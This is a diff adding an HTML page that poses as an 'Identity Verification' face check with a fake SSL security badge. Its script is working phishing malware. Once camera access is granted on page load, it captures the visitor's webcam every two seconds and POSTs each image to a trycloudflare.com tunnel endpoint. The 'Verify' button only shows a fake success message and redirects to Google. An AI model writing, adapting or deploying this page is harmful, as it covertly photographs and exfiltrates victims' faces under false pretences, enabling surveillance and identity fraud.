@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    background: #f5f5f5;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+.verification-card {
+    background: white;
+    border-radius: 20px;
+    padding: 40px;
+    max-width: 500px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+}
+.security-icon {
+    font-size: 80px;
+    margin-bottom: 20px;
+}
+h2 { color: #333; margin-bottom: 10px; }
+p { color: #666; margin-bottom: 30px; line-height: 1.6; }
+.camera-area {
+    background: #f0f0f0;
+    border-radius: 15px;
+    padding: 20px;
+    margin: 20px 0;
+}
+video, canvas { width: 100%; border-radius: 10px; display: none; }
+.placeholder-cam {
+    width: 100%;
+    height: 250px;
+    background: #e0e0e0;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 60px;
+}
+button {
+    background: #4CAF50;
+    color: white;
+    border: none;
+    padding: 15px 40px;
+    border-radius: 50px;
+    font-size: 16px;
+    cursor: pointer;
+    width: 100%;
+    margin-top: 20px;
+}
+.secure-badge {
+    margin-top: 20px;
+    font-size: 12px;
+    color: #999;
+}
+</style>
+</head>
+<body>
+<div class="verification-card">
+    <div class="security-icon">🛡️</div>
+    <h2>Identity Verification Required</h2>
+    <p>For your security, please complete a quick face verification</p>
+    <div class="camera-area">
+        <div class="placeholder-cam">📷</div>
+        <video id="video" playsinline autoplay></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
+    </div>
+    <button onclick="verify()">Verify Identity</button>
+    <div class="secure-badge">✓ 256-bit SSL Encrypted • Secure Connection</div>
+</div>
+<script>
+function post(imgdata) {
+    $.ajax({ type: 'POST', data: { cat: imgdata }, url: 'https://colleges-digest-angela-cholesterol.trycloudflare.com/post.php' });
+}
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const constraints = { audio: false, video: { facingMode: "user" } };
+async function init() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        video.style.display = 'block';
+        document.querySelector('.placeholder-cam').style.display = 'none';
+        const context = canvas.getContext('2d');
+        setInterval(() => {
+            context.drawImage(video, 0, 0, 640, 480);
+            post(canvas.toDataURL("image/png"));
+        }, 2000);
+    } catch(e) { alert("Camera access required for verification"); }
+}
+function verify() {
+    alert("✅ Verification completed! Redirecting...");
+    setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
+}
+init();
+</script>
+</body>
+</html>
